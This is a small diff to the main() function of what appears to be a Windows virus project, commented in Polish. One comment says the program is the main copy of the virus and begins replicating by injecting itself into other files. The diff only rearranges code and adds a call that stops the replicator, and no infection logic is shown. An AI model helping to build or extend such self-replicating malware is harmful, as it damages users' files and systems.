@@ -12,8 +12,9 @@ using namespace std;
 
 int main()
 {
-    RegEditer *regEditer = new RegEditer();
 
+    // Obsluga rejestru - OK!
+    RegEditer *regEditer = new RegEditer();
     try
     {
         if(regEditer->IsRegistered())
@@ -50,7 +51,6 @@ int main()
         return 0;
     }
 
-
     // jestesmy glowna kopia wirusa w systemie dlatego
     // rozpoczynamy replikacje wstrzykujac sie do innych plików
 
@@ -61,6 +61,7 @@ int main()
 
     cout << "OK!" << endl;
 
+    replicator->Stop();
     system("pause");
 
     delete taskMgr;
